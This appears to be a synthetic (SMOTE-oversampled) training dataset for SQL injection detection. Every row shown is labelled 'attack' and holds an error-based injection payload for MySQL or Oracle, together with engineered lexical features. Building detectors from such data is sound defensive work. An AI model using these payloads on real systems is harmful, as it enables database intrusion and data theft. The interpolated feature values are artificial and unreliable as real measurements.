id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000025,attack,error,"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  'wnzv'  =  'wnzv",nearest_attack_euclidean,R000066,0.18623524134748656,240.66528047724594,31.0,3.717305096830887,77.0,37.0,98.07728980479077,28.587990672455163,0.3204121803463891,0.153964294452161,0.4069201444235644,0.11870338077788553,4.0,0.0,0.0,0.0,0.0,2.0,0.0,17.587990672455167,0.0,0.0,5.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000026,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000001,0.6788913269375926,215.6116618963827,41.04466475855309,4.270037693494161,118.56699713782963,2.0,71.0,24.04466475855309,0.5499032163604457,0.009277182155473018,0.3293399665192925,0.11147963496478885,3.0,0.0,0.0,0.0,0.0,3.0,0.0,10.0,0.0,5.044664758553091,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000027,attack,error,1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,nearest_attack_euclidean,R000060,1.6921333842723865,339.9336122862171,34.0,3.636223550360592,95.31476391922936,47.53319385689144,139.4475393467951,57.63811516330122,0.27982396667426374,0.14008441111911885,0.4104957535719283,0.16959586863468915,2.9143454899036696,0.0,0.3618848366987768,0.0,0.0,2.0,0.0,28.723769673397555,0.0,1.9143454899036696,0.36188483669877636,22.361884836698778,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.2762303266024464,0.3618848366987768,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.638115163301224
SMOTE_000028,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,1.9206084147857108,338.8447242522242,33.053034500342186,3.5846906826821137,93.10989675393512,46.89393099931563,141.78786199863126,57.053034500342186,0.27423662526520254,0.13855765325138644,0.4188252177642819,0.1683805037191291,2.1060690006843688,0.0,0.0,0.0,0.0,2.0,0.0,29.420448249486725,0.0,1.5795517505132763,0.4734827498289076,22.0,0.5265172501710923,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.5265172501710922,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.526517250171092
SMOTE_000029,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000011,2.0650159062672757,338.67386995654044,34.97325077591685,3.6651071378355398,93.02674922408315,50.566873060207875,137.56687306020788,57.513374612041574,0.27472398032472395,0.14922172252553756,0.40620071077227216,0.16985358637746634,0.5133746120415748,0.0,2.4866253879584255,0.0,0.0,2.5133746120415745,0.0,28.0,0.0,3.0,0.0,25.0,0.5133746120415746,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.5133746120415746,1.0,0.5133746120415748,0.48662538795842536,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.513374612041575
SMOTE_000030,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000071,0.5138670098477067,332.7569975376325,32.756997537632486,3.4503728210040747,81.0,49.0,146.0,56.756997537632486,0.2434212815175275,0.14725484931307217,0.4387593469328273,0.170564522236573,0.7569975376324886,0.0,0.0,0.0,0.0,2.0,0.0,31.0,0.0,0.0,1.0,22.0,0.7569975376324884,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000031,attack,error,"-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000018,0.4955569371235728,331.14135408962056,33.717291820758916,3.4832846633093655,80.14135408962053,51.57593773113838,142.56541635848217,56.85864591037946,0.24201470422318966,0.1557555142899077,0.4305234278558173,0.17170635363108536,0.8586459103794599,0.0,0.8586459103794598,0.0,0.0,2.0,0.0,30.141354089620542,0.0,0.0,1.0,22.858645910379458,0.8586459103794598,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.14135408962054008,0.8586459103794599,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000032,attack,error,"-5606   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,0.8284596737975788,213.95461646882407,38.32576941147068,3.7692790286186826,63.0,37.0,90.30307764588272,23.651538822941355,0.29450534798476896,0.17296345834026114,0.42202465802323424,0.11050653565173564,0.0,0.32576941147067895,1.0,0.0,1.0,0.9999999999999999,0.0,16.32576941147068,0.0,0.0,3.0,3.0,0.0,0.32576941147067895,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000033,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000067,0.11486420947035975,326.20264259184205,40.98006606479605,4.0518926891940685,109.94019819438816,62.601321295921025,118.68105703673682,34.98006606479605,0.33711764775823183,0.19180668499909564,0.3638141182386998,0.10726154900397274,0.0,1.0,2.0,0.0,2.0,2.0,0.0,20.960132129592104,0.0,0.03986787040789774,5.980066064796052,6.980066064796051,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,5.940198194388154,2.9401981943881537,1.0,1.019933935203949,0.9800660647960512,0.019933935203948927,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.019933935203948705,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,13.920264259184204
SMOTE_000034,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000008,4.0882563335332955,330.4781705700857,34.0,3.4977526065112583,83.84546079439684,48.0,142.3863480140079,56.246361761680944,0.2542876517474795,0.1453478460967641,0.4301650753409044,0.1701994268148519,0.0,0.0,1.0,0.0,0.0,2.0,0.0,29.66181568224126,0.0,1.7536382383190534,0.0,23.0,0.0,0.0,0.0,0.41545392056031566,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.5845460794396844,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.41545392056031566,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000035,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R000014,0.8509030212621191,207.37133488591564,34.0,3.7506822142947867,57.43792868607224,40.76185271439758,83.62866511408437,25.542888371361457,0.27662654979917634,0.19647975307584725,0.4036112338721732,0.12328246325280319,0.8476294571204853,0.15237054287951468,2.0,0.0,0.8476294571204853,2.0,0.0,14.69525891424097,0.0,0.0,4.152370542879515,4.847629457120485,0.8476294571204854,0.15237054287951468,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.695258914240971,0.0,1.0,0.8476294571204853,0.8476294571204853,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1523705428795147,0.1523705428795147,6.695258914240971
SMOTE_000036,attack,error,"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000020,0.2321463754254655,217.45228821276908,38.90871470212818,3.764367212819848,63.0,37.0,92.63485880851273,24.817429404256362,0.289737446827842,0.17016326242270088,0.42598529549221587,0.11411399525724122,0.0,0.9087147021281814,1.0,0.0,1.0,0.9999999999999999,0.0,16.908714702128183,0.0,0.0,3.0,3.0,0.0,0.9087147021281814,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,-1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000037,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000055,0.8817529777194285,248.41633806356745,35.41633806356744,3.9996740494962415,94.0,35.0,89.0,30.416338063567437,0.3783985008100897,0.14089305881226746,0.3582709209797658,0.12243751939787702,0.41633806356743874,0.0,0.0,0.0,2.0,0.9999999999999999,0.0,18.0,0.0,2.0,6.0,3.0,0.4163380635674391,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,-1.1102230246251565e-16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.0
SMOTE_000038,attack,error,"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000073,0.8118468572305302,283.156816034854,36.83372735860584,3.9706526902389943,101.66745471721168,43.0,104.99054339345982,33.498817924182475,0.3594984982850754,0.15201444197440672,0.37018396513930196,0.11830309460121594,0.0,0.0,1.6674547172116825,0.0,2.0,2.0,0.0,19.831363206970792,0.0,2.0,5.0,5.667454717211683,0.0,0.0,0.8337273586058412,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.8337273586058411,2.0,1.1662726413941589,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000039,attack,error,"1,  (  select 6825 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",nearest_attack_euclidean,R000055,1.1623459721997136,260.4434918144944,35.717893758528525,3.998642688524133,98.06806463166164,36.914383356076065,93.54666047068065,31.914383356076065,0.3768708575012044,0.14165651691934894,0.35914114281234943,0.1223314827670972,0.9571916780380325,0.0,0.0,0.0,2.0,1.2392979195095082,0.0,18.478595839019015,0.0,2.0,5.760702080490492,3.7178937585285237,0.23929791950950818,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.239297919509508,0.0,0.23929791950950807,2.0,-1.1102230246251565e-16,0.23929791950950816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,8.717893758528525
SMOTE_000040,attack,error,"1""  )   as mwja where 7881  =  7881 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",nearest_attack_euclidean,R000067,0.9829988373097054,327.0,40.6986891100592,4.053217195652129,110.0,63.0,119.0,35.0,0.3363914373088685,0.1926605504587156,0.363914373088685,0.10703363914373089,0.30131088994080035,0.6986891100591996,2.0,0.0,2.0,2.0,0.0,21.0,0.0,0.0,6.0,7.0,0.3013108899408004,0.6986891100591996,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000041,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'lkun' like 'lkun",nearest_attack_euclidean,R000054,1.2262388814190233,225.46917924744545,32.39065566053182,3.9211862667978443,81.0,40.12524528425455,79.9532783026591,24.39065566053182,0.3595764662190543,0.17760672747436906,0.3546061624958092,0.10821064381076746,3.2186886789363633,0.0,0.0,0.0,0.0,1.3906556605318183,0.0,14.0,0.0,0.0,5.0,2.171966981595455,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3906556605318185,0.0,0.3906556605318184,0.0,0.6093443394681816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.390655660531818
SMOTE_000042,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000039,0.5164676017678527,235.3221320892817,32.706192869048515,3.8866822575962146,80.41238573809703,43.824771476194066,85.49736061308761,25.58761426190297,0.3418523014224419,0.18642503924258266,0.3630481766390933,0.10867448269588217,2.293807130951484,0.0,0.0,0.0,0.0,2.0,0.0,14.587614261902967,0.0,0.0,5.0,3.7061928690485164,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.853096434524258,0.0,0.853096434524258,0.0,0.1469035654757419,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.853096434524258
SMOTE_000043,attack,error,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'dqjq'  =  'dqjq",nearest_attack_euclidean,R000022,0.8678222909968067,202.75404129536378,28.84716528664811,3.452946821893945,48.97671900217892,34.15283471335189,91.21254543541947,28.411942144413516,0.24162757263552376,0.16962791498402138,0.4487088271332292,0.14003568524722565,4.0,0.0,0.0,0.0,0.28238842888270316,2.0,0.0,17.12955371553081,0.0,0.0,4.717611571117297,2.2823884288827028,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.564776857765406,0.0,0.0,0.2823884288827031,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.84716528664811
SMOTE_000044,attack,error,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'ayqn' like 'ayqn",nearest_attack_euclidean,R000029,0.6288057547021635,188.02670960488217,29.774810043901983,3.6574406009657867,49.450379912196034,38.09924017560793,75.25189956098018,25.22518995609802,0.263012459140591,0.2028788805644519,0.39994219788215923,0.1341664624127978,4.0,0.0,0.0,0.0,0.0,0.9999999999999999,0.0,14.450379912196034,0.0,0.0,5.774810043901982,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.774810043901982,0.22518995609801798,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000045,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000069,2.3790044216195536,332.17795302083925,32.19632550347321,3.5371749136756794,87.00612416087797,46.595100671297615,140.78530201389285,57.791426174770834,0.2623023326614097,0.1402143963420853,0.4236557214055262,0.1738275495909788,0.0,1.5951006712976188,0.0,0.0,0.0,2.3987751678244047,0.0,29.398775167824404,0.7975503356488093,1.803674496526786,0.39877516782440425,22.398775167824404,0.0,0.3987751678244047,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.3987751678244047,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.398775167824405
SMOTE_000046,attack,error,-7319 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,nearest_attack_euclidean,R000008,0.6385259179573451,323.4451774992592,33.33223375111113,3.591852309054943,88.22258874962962,47.33223375111113,132.8903549985185,55.0,0.27275751889683786,0.14634858758413385,0.4108484994962539,0.17004539402277438,0.0,0.0,0.777411250370378,0.0,0.0,2.0,0.0,28.222588749629622,0.0,3.0,0.0,22.777411250370378,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.22258874962962205,0.7774112503703778,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_000047,attack,error,"1""  )   where 1392  =  1392 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R000052,2.505205618712674,210.96255298725254,34.0,3.855418609939215,63.822316421782276,42.756973881806964,80.03744701274746,24.345815670915826,0.3018617468635868,0.20251601942113645,0.3800157390090204,0.11560649470625635,0.448605223638608,0.5513947763613921,2.0,0.0,0.44860522363860794,2.0,0.0,13.897210447277216,0.0,0.0,4.551394776361392,4.448605223638608,0.44860522363860783,0.551394776361392,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.8972104472772156,0.0,1.0,0.44860522363860794,0.44860522363860783,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5513947763613921,0.5513947763613921,5.8972104472772156
SMOTE_000048,attack,error,"1'||  (  select 'xuou' from dual where 7681  =  7681 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )     )  ||'",nearest_attack_euclidean,R000033,0.9380112215705484,194.89092452348575,32.90388948993467,3.9458638819574645,55.98703503355109,44.205185986579565,67.39740700671021,27.30129649664489,0.2869591598911009,0.22704012516287164,0.3458377321059279,0.1401629828400996,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.0,0.0,0.0,5.301296496644891,6.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,1.0,0.6987035033551089,0.3012964966448912,0.6987035033551088,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.698703503355109
